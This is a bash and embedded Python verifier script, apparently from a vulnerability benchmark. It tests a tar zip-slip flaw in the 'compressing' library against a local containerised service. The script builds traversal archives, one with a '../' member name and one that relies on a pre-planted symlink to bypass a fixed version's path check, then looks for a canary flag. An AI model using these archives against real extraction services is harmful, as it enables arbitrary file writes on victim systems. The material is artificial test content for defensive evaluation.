#!/usr/bin/env bash
# verify.sh --seed|--residual for PCBV2-0069 (compressing-cve-2026-40931, tar zip-slip).
#
# Mechanism (real compressing.tar.uncompress() behind POST /extract; state-write canary):
#   - seed     : tar member `../pcb_witness/flag.txt` (body = RUN_FLAG) into a CLEAN destDir.
#                V0 2.0.0  path.join(destDir, name)          -> escapes, flag in witness dir.
#                V1 2.1.0  isPathWithinParent string check   -> blocked (escaped=false).
#   - residual : tar member `link/flag.txt` + header `x-pcb-poison: link` which pre-plants
#                destDir/link -> ../pcb_witness (git-delivered symlink poisoning).
#                V1 2.1.0  string check passes, write follows on-disk symlink -> ESCAPES.
# Flag channel: flag is embedded in the tar payload by the verifier (payload=RUN_FLAG);
# the service reflects it back as canary_value iff the marker escaped to pcb_witness.
# Judge uses JUDGE_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}".
# Exit: 0=effect 10=no effect 20=env failure 30=arg error
set -uo pipefail
JUDGE_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}"
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# dynamic host port for the profile service (container port 8080)
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-8080}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$PORT" ]] || { echo "verify: cannot resolve host port for $VERSION" >&2; exit 20; }
BASE="http://127.0.0.1:$PORT"

# readiness probe
READY=""
for _ in $(seq 1 30); do
  code="$(curl -s -o /dev/null -w '%{http_code}' "$BASE/healthz" 2>/dev/null || true)"
  if [[ "$code" == "200" ]]; then READY=1; break; fi
  sleep 2
done
if [[ -z "$READY" ]]; then echo "verify: service $VERSION not ready on $BASE" >&2; exit 20; fi

"$PY" - "$BASE" "$RUN_FLAG" "$JUDGE_FLAG" "$MODE" <<'PYEOF'
import json, io, tarfile, sys
import requests

base, payload_flag, judge, mode = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
probe = "seed" if mode == "--seed" else "residual"

# Build the real GNU-format tar with the stdlib tarfile module (server parses it with the
# REAL compressing library).
buf = io.BytesIO()
tf = tarfile.open(fileobj=buf, mode="w", format=tarfile.GNU_FORMAT)
name = "../pcb_witness/flag.txt" if probe == "seed" else "link/flag.txt"
data = (payload_flag + "\n").encode()
ti = tarfile.TarInfo(name)
ti.size = len(data)
ti.mode = 0o644
tf.addfile(ti, io.BytesIO(data))
tf.close()
tar_bytes = buf.getvalue()

headers = {"Content-Type": "application/x-tar"}
if probe == "residual":
    headers["x-pcb-poison"] = "link"  # pre-plant destDir/link -> ../pcb_witness

try:
    r = requests.post(base + "/extract", data=tar_bytes, headers=headers, timeout=40)
    resp = r.json()
except Exception as e:  # noqa: BLE001
    print(json.dumps({"error": str(e)}))
    sys.exit(20)

print(json.dumps(resp, default=str))
escaped = bool(resp.get("escaped"))
canary = resp.get("canary_value") or ""
if escaped and judge in canary:
    sys.exit(0)   # effect: marker (flag) escaped into the witness dir
sys.exit(10)      # blocked / flag not observed
PYEOF
rc=$?
exit $rc
